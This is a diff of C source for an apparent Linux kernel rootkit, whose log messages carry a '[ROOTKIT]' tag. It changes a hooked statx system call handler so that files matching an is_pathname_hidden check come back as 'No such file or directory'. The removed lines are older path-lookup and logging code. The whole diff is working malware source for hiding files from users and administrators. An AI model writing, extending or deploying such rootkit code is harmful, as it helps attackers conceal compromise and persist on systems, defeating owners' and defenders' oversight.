@@ -15,10 +15,7 @@ static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, con
                      const char __user *const s_filename, const int i32_flags)
 {
     long l_ret               = 0;    // Return value of the real syscall
-    int i_err                = 0;    // Return value for user_path_at
     const char *s_filename_k = NULL; // Name of the file
-    const char *s_pathname   = NULL; // Pathname of the file
-    path_t path;                     // Path structure for the file
 
     s_filename_k = strndup_user(s_filename, PATH_MAX);
 
@@ -31,27 +28,10 @@ static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, con
 
     kfree_const(s_filename_k);
 
-    i_err = user_path_at(i32_dfd, s_filename, i32_flags, &path);
+    IF_U (is_pathname_hidden(i32_dfd, s_filename, i32_flags)) {
+        pr_info("[ROOTKIT]   * Hiding file\n");
 
-    IF_U (i_err != 0) {
-        pr_err("[ROOTKIT]   * Could not get path\n");
-    }
-    else {
-        s_pathname = path_get_pathname(&path);
-        IF_U (IS_ERR_OR_NULL(s_pathname)) {
-            pr_err("[ROOTKIT]   * Could not get pathname\n");
-        }
-        else {
-            pr_info("[ROOTKIT]   * Path: %s\n", s_pathname);
-            kfree_const(s_pathname);
-        }
-
-        IF_U (is_path_hidden(&path)) {
-            pr_info("[ROOTKIT]   * Hiding file\n");
-
-            return -ENOENT; // No such file or directory
-        }
-        path_put(&path);
+        return -ENOENT; // No such file or directory
     }
 
     l_ret = orig_func(p_regs);
